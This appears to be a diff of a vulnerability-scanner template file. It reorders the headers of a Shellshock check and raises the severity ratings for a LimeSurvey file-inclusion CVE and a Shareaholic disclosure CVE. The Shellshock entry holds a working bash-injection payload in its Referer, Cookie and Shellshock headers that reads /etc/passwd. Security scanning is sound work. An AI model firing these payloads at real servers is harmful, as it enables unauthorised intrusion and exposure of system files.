@@ -3325,9 +3325,9 @@
       "requests": [
         {
           "headers": {
+            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
             "Cookie": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ",
-            "Referer": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
+            "Shellshock": "() { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd "
           },
           "method": "GET",
           "path": [
@@ -10133,7 +10133,7 @@
       "id": "CVE-2020-11455",
       "info": {
         "name": "LimeSurvey 4.1.11 - Local File Inclusion",
-        "severity": "medium"
+        "severity": "critical"
       },
       "requests": [
         {
@@ -18143,7 +18143,7 @@
       "id": "CVE-2022-0594",
       "info": {
         "name": "Shareaholic < 9.7.6 - Information Disclosure",
-        "severity": "low"
+        "severity": "medium"
       },
       "requests": [
         {
